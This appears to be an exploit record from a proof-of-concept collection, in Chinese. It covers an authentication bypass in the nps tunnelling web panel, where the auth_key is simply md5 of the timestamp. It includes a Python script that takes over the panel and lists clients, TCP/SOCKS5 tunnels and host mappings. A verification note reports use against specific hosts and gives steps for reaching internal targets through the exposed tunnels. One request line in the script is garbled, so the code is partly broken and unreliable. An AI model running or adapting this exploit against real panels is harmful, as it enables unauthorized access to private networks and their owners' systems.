# nps web 管理面板 auth_key=md5(timestamp) 认证绕过 + 隧道/客户端枚举

- **code**: nps-web-管理面板-auth_key-md5-timestamp-认证绕过-隧道-客户端枚举
- **kind**: exp
- **category**: unauthorized
- **component**: ehang nps (0.26.10 / 0.26.9)
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 203.0.113.119:8080 与 203.0.113.121:8080 均实测通过：/Index/Index 由 302 跳登录变为 200（26267/26260 字节后台首页）；/client/list 返回 {"total":1,"rows":[{Id:2,Addr:"203.0.113.113"/"203.0.113.96",Version:"0.26.10"/"0.26.9",IsConnect:true}]}；/index/gettunnel 返回 10 条 tcp + 4/6 条 socks5 隧道真实 JSON；/index/hostlist 返回 {"total":0}。凭此读出隧道 target 与客户端出口 IP（新资产 id 84/85）。
- **path**: pocs/nps-web-管理面板-auth_key-md5-timestamp-认证绕过-隧道-客户端枚举/nps_panel_bypass.py
- **tags**: nps,内网穿透,认证绕过,tunnel,面板接管
- **created_at**: 2026-09-28T10:14:59.177Z
- **found_by**: exploit

## 描述

绕过 nps web 面板认证（auth_key=md5(timestamp)）并只读枚举 client/隧道/host，用于定位内网穿透隧道与客户端出口 IP

## 用法

```
把 PROXY 改成实际出口，替换 base 为目标面板地址（默认端口 8080），直接 python 运行：
python nps_panel_bypass.py
关键点：任意路径后附加 auth_key=md5(str(int(time.time())))&timestamp=<同一秒> 即通过校验。
枚举到隧道后，用 tcp 隧道端口直接访问内网 target（本次 203.0.113.119:31401 → 10.8.0.2:31401）。
```

## 正文

```
#!/usr/bin/env python3
# nps 面板 auth_key=md5(timestamp) 认证绕过 + 全量只读枚举（客户端 / 隧道 / host 映射）
# 依赖: requests
import time, hashlib, json, requests
requests.packages.urllib3.disable_warnings()

PROXY = {"http": "http://127.0.0.1:7892", "https": "http://127.0.0.1:7892"}  # 按实际出口调整
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36"


def signed(base, path):
    now = int(time.time())
    key = hashlib.md5(str(now).encode()).hexdigest()          # 关键: auth_key = md5(timestamp)
    sep = '&' if '?' in path else '?'
    return "%s%s%s auth_key=%s&timestamp=%s".replace(" ", "") % (base, path, sep, key, now)


def main(base):
    s = requests.Session(); s.trust_env = False; s.proxies = PROXY
    h = {"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"}
    r = s.get(signed(base, "/Index/Index"), headers=h, timeout=15, verify=False)
    print("panel:", r.status_code, len(r.content))            # 200 = 绕过成功（原为 302 跳登录）
    for path, data in [("/client/list", {"offset": 0, "limit": 100, "search": ""}),
                       ("/index/gettunnel", {"offset": 0, "limit": 100, "type": "tcp", "client_id": "", "search": ""}),
                       ("/index/gettunnel", {"offset": 0, "limit": 100, "type": "socks5", "client_id": "", "search": ""}),
                       ("/index/hostlist", {"offset": 0, "limit": 100, "search": ""})]:
        r = target8.example.com(signed(base, path), data=data, headers=h, timeout=15, verify=False)
        print(path, r.status_code, r.text[:300])


if __name__ == "__main__":
    for b in ["http://IP:8080", "http://IP2:8080"]:
        main(b)

```
